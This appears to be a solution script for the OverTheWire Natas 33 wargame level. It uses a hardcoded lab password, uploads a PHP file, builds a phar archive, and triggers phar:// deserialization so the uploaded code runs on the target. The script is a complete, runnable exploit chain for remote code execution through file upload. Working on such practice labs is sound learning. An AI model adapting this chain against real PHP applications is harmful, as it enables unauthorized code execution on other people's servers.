import requests
import string
import subprocess
import sys
import hashlib
from requests.auth import HTTPBasicAuth

php_filename = '33.php'
phar_filename = '33.phar'
content = open(php_filename, 'rb').read()
content_hash = hashlib.md5(content).hexdigest()

url = 'http://natas33.natas.labs.overthewire.org/index.php'
response = ''
# base auth
auth = HTTPBasicAuth('natas33', 'shoogeiGa2yee3de6Aex8uaXeech5eey')

# setup a new session
session = requests.Session()

#upload the php file
data = {'filename' : php_filename, 'submit' : 'Upload File'}
files = {'uploadedfile' : content}
response = session.post(url, auth=auth, data=data, files=files)

#create the phar file
command = subprocess.run(['php7.0', '-d', 'phar.readonly=0', '33_phar.php',phar_filename, php_filename, content_hash], capture_output=True)
print(command.stdout)
print(command.stderr)

#send the phar file
phar = open(phar_filename, 'rb')
data = {'filename': phar_filename, 'submit' : 'Upload File'}
files = {'uploadedfile': phar}
response = session.post(url, auth=auth, data=data, files=files)
text = response.text
print(text)

#load the phar file
data = {'filename': 'phar://' + phar_filename + '/text.txt', 'submit' : 'Upload File'}
files = {'uploadedfile': phar}
response = session.post(url, auth=auth, data=data, files=files)

text = response.text
print(text)
